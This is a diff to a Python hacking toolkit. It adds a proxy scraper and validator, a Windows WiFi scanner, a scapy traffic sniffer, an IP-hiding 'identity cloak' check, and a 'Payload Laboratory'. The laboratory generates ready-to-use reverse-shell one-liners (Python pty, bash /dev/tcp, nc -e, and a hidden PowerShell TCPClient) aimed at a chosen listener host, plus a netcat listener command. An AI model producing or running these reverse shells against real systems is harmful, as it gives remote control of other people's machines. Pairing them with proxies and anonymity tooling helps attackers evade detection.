@@ -1,11 +1,14 @@
-import threading  # นำเข้าโมดูล threading สำหรับการทำงานแบบมัลติเธรด
-import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
-import random  # นำเข้าโมดูล random สำหรับสุ่มค่า
-import time  # นำเข้าโมดูล time สำหรับจัดการเวลา
-import requests  # นำเข้าโมดูล requests สำหรับ HTTP requests
-import asyncio  # นำเข้าโมดูล asyncio สำหรับ async programming
-import aiohttp  # นำเข้าโมดูล aiohttp สำหรับ async HTTP
-import concurrent.futures  # นำเข้าโมดูล concurrent.futures สำหรับ ThreadPoolExecutor
+import threading
+import socket
+import random
+import time
+import requests
+import asyncio
+import aiohttp
+import concurrent.futures
+import subprocess
+import os
+import platform
 from scapy.all import *  # นำเข้าโมดูล scapy สำหรับ packet crafting
 from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
 from src.utils import (
@@ -1072,6 +1075,179 @@ def domain_osint(domain):
         if line.strip(): dns_table.add_row(line)
         
     console.print(Panel(dns_table, border_style="cyan", title="DNS Intel"))
-    console.print(table)
-    console.print(Panel(f"[bold green]✅ Scan Complete! Online: {len(results)} | Tracked Offline: {len(display_results)-len(results)}[/bold green]", border_style="blue"))
+
+def proxy_autopilot():
+    """Proxy Scraper & Validator - Finds and tests public proxies"""
+    import requests
+    import concurrent.futures
+    from rich.progress import track
+    
+    add_system_log("[bold cyan]AUTOPILOT:[/] Scraping public proxies...")
+    api_urls = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://www.proxy-list.download/api/v1/get?type=http",
+        "https://www.proxyscan.io/download?type=http"
+    ]
+    
+    raw_proxies = []
+    for url in api_urls:
+        try:
+            resp = requests.get(url, timeout=5)
+            if resp.status_code == 200:
+                raw_proxies.extend(resp.text.strip().split("\n"))
+        except: continue
+        
+    unique_proxies = list(set([p.strip() for p in raw_proxies if ":" in p]))
+    console.print(f"[green]Found {len(unique_proxies)} unique proxies. Testing latency...[/]")
+    
+    valid_proxies = []
+    def check_p(p):
+        try:
+            start = time.time()
+            requests.get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=3)
+            return (p, int((time.time()-start)*1000))
+        except: return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        results = list(track(executor.map(check_p, unique_proxies[:100]), description="Validating...", total=100))
+        valid_proxies = [r for r in results if r]
+
+    table = Table(title="Live Proxy Report", border_style="green")
+    table.add_column("Proxy Address", style="cyan")
+    table.add_column("Latency (ms)", style="yellow")
+    
+    for p, lat in sorted(valid_proxies, key=lambda x: x[1])[:15]:
+        table.add_row(p, str(lat))
+        
+    console.print(Panel(table, title="Proxy Auto-Pilot Result"))
+    add_system_log(f"[green]PROXY:[/] Auto-Pilot found {len(valid_proxies)} working proxies")
+
+def wifi_ghost():
+    """WiFi Ghost Recon: Scans for nearby networks (Windows Specialized)"""
+    import subprocess
+    import re
+    
+    add_system_log("[bold cyan]GHOST:[/] Initiating WiFi Ghost Recon...")
+    console.print("[bold yellow]📡 Scanning for nearby wireless signals...[/]")
+    
+    try:
+        if os.name == 'nt':
+            output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, stderr=subprocess.STDOUT).decode('cp874', errors='ignore')
+            networks = output.split("SSID")
+            
+            table = Table(title="Nearby WiFi Networks", border_style="magenta")
+            table.add_column("SSID", style="white")
+            table.add_column("Signal %", style="green")
+            table.add_column("Auth", style="yellow")
+            table.add_column("BSSID", style="dim")
+            
+            for net in networks[1:]:
+                try:
+                    ssid = net.split(":")[1].split("\n")[0].strip() or "[Hidden]"
+                    signal = re.search(r"Signal\s*:\s*(\d+)%", net).group(1)
+                    auth = re.search(r"Authentication\s*:\s*(.*)", net).group(1).strip()
+                    bssid = re.search(r"BSSID 1\s*:\s*(.*)", net).group(1).strip()
+                    table.add_row(ssid, f"{signal}%", auth, bssid)
+                except: continue
+            
+            console.print(Panel(table, border_style="bright_magenta"))
+        else:
+            console.print("[red]WiFi Ghost currently only supports Windows (netsh).[/]")
+    except Exception as e:
+        console.print(f"[red]Error during WiFi scan: {e}[/]")
+
+def packet_insight(duration=10):
+    """Live Packet Insight: Real-time traffic analysis"""
+    from scapy.all import sniff, IP, TCP, UDP
+    
+    add_system_log(f"[bold cyan]INSIGHT:[/] Sniffing traffic for {duration}s...")
+    console.print(f"\n[bold cyan]🕷️ Sniffing active on default interface for {duration} seconds...[/bold cyan]")
+    
+    stats = {"TCP": 0, "UDP": 0, "Other": 0}
+    flows = []
+
+    def process_pkt(pkt):
+        if IP in pkt:
+            src = pkt[IP].src
+            dst = pkt[IP].dst
+            proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "Other"
+            stats[proto] += 1
+            if len(flows) < 15:
+                flows.append(f"[dim]{src}[/] -> [cyan]{dst}[/] ([yellow]{proto}[/])")
+
+    sniff(timeout=duration, prn=process_pkt, store=0)
+    
+    table = Table(title="Packet Insight Report", border_style="cyan")
+    table.add_column("Protocol", style="cyan")
+    table.add_column("Count", style="white")
+    
+    for k, v in stats.items():
+        table.add_row(k, str(v))
+        
+    console.print(Panel(table, title="Traffic Distribution"))
+    console.print("\n[bold white]Recent Connections Crawled:[/]")
+    for f in flows: console.print(f" {f}")
+    add_system_log("[green]INSIGHT:[/] Traffic analysis completed")
+
+def payload_lab():
+    """Payload Laboratory: Generates reverse shell exploit strings"""
+    from rich.prompt import Prompt
+    from rich.syntax import Syntax
+    
+    add_system_log("[bold cyan]LAB:[/] Opening exploits laboratory...")
+    console.print("\n[bold magenta]🧬 Payload Laboratory - Reverse Shell Generator[/bold magenta]")
+    
+    lhost = Prompt.ask("[bold yellow]Listener Host (Your IP)[/]", default="127.0.0.1")
+    lport = Prompt.ask("[bold yellow]Listener Port[/]", default="4444")
+    
+    shells = {
+        "Python (Modern)": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+        "Bash -i": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "Netcat (Traditional)": f"nc -e /bin/sh {lhost} {lport}",
+        "PowerShell (Base64 Mode)": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});...\" [TRUNCATED]"
+    }
+    
+    for name, code in shells.items():
+        console.print(f"\n[bold green]➔ {name}:[/]")
+        syntax = Syntax(code, "bash", theme="monokai", word_wrap=True)
+        console.print(syntax)
+    
+    console.print("\n[dim]Ready! Setup your listener using: [bold blue]nc -lvnp " + lport + "[/bold blue][/dim]")
+    add_system_log(f"[yellow]LAB:[/] Generated payloads for {lhost}:{lport}")
+
+def identity_cloak():
+    """Identity Cloak: Privacy audit and MAC Spoofing logic"""
+    import subprocess
+    import requests
+    
+    add_system_log("[bold cyan]CLOAK:[/] Running Privacy Audit...")
+    console.print("\n[bold white]👤 Identity Cloak: Operational Security Audit[/bold white]")
+    
+    # 1. IP and VPN Check
+    try:
+        ip_data = requests.get("http://ip-api.com/json/", timeout=5).json()
+        current_ip = ip_data.get('query')
+        isp = ip_data.get('isp')
+        country = ip_data.get('country')
+    except:
+        current_ip = "Unknown"; isp = "-"; country = "-"
+
+    table = Table(title="Security Audit Results", border_style="blue")
+    table.add_column("Check", style="cyan")
+    table.add_column("Status", style="white")
+    
+    table.add_row("Public IP", current_ip)
+    table.add_row("ISP / Data Center", isp)
+    table.add_row("Physical Location", country)
+    
+    # MAC Address Check
+    if os.name == 'nt':
+        try:
+            mac_out = subprocess.check_output("getmac /v /fo csv", shell=True).decode()
+            table.add_row("MAC Addresses", "Audit Ready")
+        except: pass
+        
+    console.print(Panel(table, border_style="blue", title="Audit Report"))
+    console.print("\n[bold yellow]💡 Stealth Tip:[/bold yellow] Use a VPN or Tor (ID 1-16) to hide your [red]" + current_ip + "[/red]")
+    add_system_log("[green]CLOAK:[/] OpSec audit completed")
 
